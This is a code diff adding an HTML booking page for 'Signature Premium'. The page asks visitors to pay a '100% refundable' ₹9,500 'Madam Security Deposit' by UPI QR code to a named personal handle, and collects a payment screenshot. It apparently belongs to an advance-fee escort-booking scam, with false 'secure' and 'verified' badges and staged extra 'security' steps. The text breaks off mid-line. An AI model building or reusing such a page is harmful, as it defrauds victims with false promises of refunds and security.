@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Signature Premium - Secure Booking</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}body{font-family:Inter,sans-serif;background:#080808;color:#fff}
+.hdr{background:#c70000;padding:10px;text-align:center;font-weight:900;letter-spacing:2px;font-size:10px;position:sticky;top:0;z-index:100}
+.steps{display:flex;background:#111;border-bottom:1px solid #222;position:sticky;top:30px;z-index:99}
+.steps div{flex:1;text-align:center;padding:11px 2px;font-size:9px;font-weight:900;color:#555;border-bottom:3px solid #222}
+.steps div.on{color:#fff;border-color:#c70000;background:#1a0a0a}
+.steps div.ok{color:#00ff88;border-color:#00c851;background:#0a1a0a}
+.wrap{max-width:480px;margin:0 auto;background:#151515;min-height:100vh}
+.top{padding:26px 20px;text-align:center;border-bottom:1px solid #222}
+.top h2{font-size:20px;font-weight:900}.top p{font-size:11px;color:#aaa;margin-top:8px;line-height:1.6}
+.badge{display:inline-block;padding:5px 12px;border-radius:20px;font-size:9px;font-weight:900;margin-top:10px;letter-spacing:1px}
+.box{padding:20px}
+.alert{background:#1a1a1a;border:1px solid #2a2a2a;padding:14px;border-radius:12px;font-size:11px;line-height:1.7;color:#ccc}
+.qrCard{background:#fff;border-radius:18px;padding:16px;text-align:center;margin-top:14px}
+.qrCard img{width:200px;height:200px;border-radius:12px}
+.miniRow{display:flex;gap:10px;margin-top:12px}
+.mini{background:#0f0f0f;border:1px solid #222;border-radius:12px;padding:10px;display:flex;gap:10px;align-items:center;flex:1}
+.mini img{width:52px;height:52px;border-radius:8px;background:#fff;padding:3px}
+.upiRow{display:flex;gap:8px;margin-top:14px}
+.upiRow input{flex:1;background:#0a0a0a;border:1.5px solid #333;color:#fff;padding:13px;border-radius:12px;font-weight:800}
+.btn{border:none;border-radius:12px;padding:13px 16px;font-weight:900;font-size:11px;cursor:pointer}
+.btnR{background:#c70000;color:#fff}.btnD{background:#222;color:#fff;border:1px solid #333}
+.payGrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+.pay{border-radius:14px;padding:15px;text-align:center;font-weight:900;font-size:11px;text-decoration:none;display:flex;flex-direction:column;align-items:center;gap:5px;border:1.5px solid #2a2a2a}
+.pay:active{transform:scale(.96)}
+.payG{background:#fff;color:#000}.payP{background:#5f259f;color:#fff}.payTM{background:#00baf2;color:#fff}.payU{background:#111;color:#fff}
+.lab{font-size:9px;font-weight:900;color:#777;letter-spacing:1.5px;margin:20px 0 8px;display:block}
+.upBox{border:2px dashed #c70000;background:#1a1010;border-radius:16px;padding:16px;text-align:center;margin-top:10px;cursor:pointer}
+.upBox input{display:none}.upBox img{width:100%;max-height:280px;object-fit:contain;border-radius:10px;margin-top:12px;display:none;border:1px solid #333}
+.upBox.done{border-style:solid;border-color:#00c851;background:#0f1f0f}.upBox.done img{display:block}
+.cont{width:100%;padding:17px;background:linear-gradient(90deg,#c70000,#ff2222);color:#fff;border:none;border-radius:14px;font-weight:900;font-size:14px;margin-top:18px;cursor:pointer;box-shadow:0 8px 20px rgba(199,0,0,.35)}
+.hid{display:none}
+.finalBox{background:#0e1f0e;border:1px solid #00c851;border-radius:16px;padding:18px}
+.prevGrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px}
+.prevGrid div{background:#0a0a0a;border:1px solid #222;border-radius:12px;padding:8px;text-align:center}
+.prevGrid img{width:100%;border-radius:8px;max-height:200px;object-fit:contain}
+</style>
+</head>
+<body>
+<div class="hdr">SIGNATURE PREMIUM • 100% SECURE & REFUNDABLE • VERIFIED</div>
+<div class="steps"><div id="st1" class="on">STEP 1<br>MADAM SECURITY</div><div id="st2">STEP 2<br>CUSTOMER SECURITY</div><div id="st3">STEP 3<br>BOOKING CONFIRMED</div></div>
+<div class="wrap">
+
+<!-- STEP 1 ONLY -->
+<div id="p1">
+<div class="top" style="background:linear-gradient(180deg,#1e1e1e,#151515)"><h2>Step 1: Madam Security Deposit</h2><p>One-time verification fee for new users.<br>100% Refundable after service completion.</p><span class="badge" style="background:#c70000">SECURE PAYMENT • ₹9,500 • UPI VERIFIED</span></div>
+<div class="box">
+<div class="alert"><b>What is Madam Security?</b><br>• This is a one-time refundable deposit of ₹9,500 for Madam verification.<br>• Required to activate your profile and proceed.<br>• 100% refundable to your source account after service.</div>
+
+<span class="lab">SCAN QR - AUTO AMOUNT ₹9,500</span>
+<div class="qrCard"><img src="https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=upi://pay?pa=kiran9443@ptyes%26pn=Signature%20Premium%26am=9500%26cu=INR"><div style="color:#111;font-weight:900;margin-top:10px;font-size:12px">kiran9443@ptyes • ₹9,500 AUTO</div></div>
+
+<div class="miniRow">
+<div class="mini"><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://
